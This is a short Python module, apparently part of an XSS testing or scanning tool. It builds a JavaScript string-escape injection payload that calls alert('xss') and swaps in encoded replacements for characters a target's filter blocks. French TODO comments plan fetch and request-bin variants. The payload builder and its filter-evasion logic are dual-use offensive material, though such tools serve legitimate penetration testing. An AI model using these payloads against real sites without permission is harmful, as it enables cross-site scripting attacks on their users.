from models import AttackType, Payload, PayloadType, FilterModel
from modules.utils import *


BASE_PAYLOADS = {
    "ESCAPE_JS": {
        "payload": """'; FUNCTION("ARGS"); var dummy= ' """,
        "used_chars": ["'", ';','FUNCTION', '(', 'ARGS', ')', '"']
    }
}


def build_ESCAPE_JS_payloads(filterModel: FilterModel) -> list[Payload]:
    """
    Builds payloads for the ESCAPE_JS attack type
    """
    # TODO: faire une construction de payload petit à petit, ne pas tout retourner d'un coup

    payloads = []

    payload = BASE_PAYLOADS['ESCAPE_JS']['payload']
    for char in BASE_PAYLOADS['ESCAPE_JS']['used_chars']:
        if char in filterModel.filteredChars:
            # TODO: tous les tester petit à petit jusqu'à ce que le payload fonctionne
            payload = payload.replace(char, SPECIAL_CHARS['for_js_escape'][char][0])

        if char == "FUNCTION":
            # TODO: mettre toutes les fonctions equivalentes au alert, puis au fetch, 
            payload = payload.replace("FUNCTION", "alert")

        elif char == "ARGS":
            # TODO: mettre les arguments en fonction du type alert ou request bin
            payload = payload.replace("ARGS", "xss")

    payloads.append(Payload(value=payload, payloadType=PayloadType.ALERT))

    return payloads


def get_payloads_subset(attackType: AttackType, filterModel: FilterModel) -> list[Payload]:
    """
    Returns a subset of payloads to test, based on the attack type, and the filters
    """
    if attackType == AttackType.ESCAPE_JS:
        return build_ESCAPE_JS_payloads(filterModel=filterModel)
    
    else:
        raise NotImplementedError(f"Attack type {attackType} not implemented yet")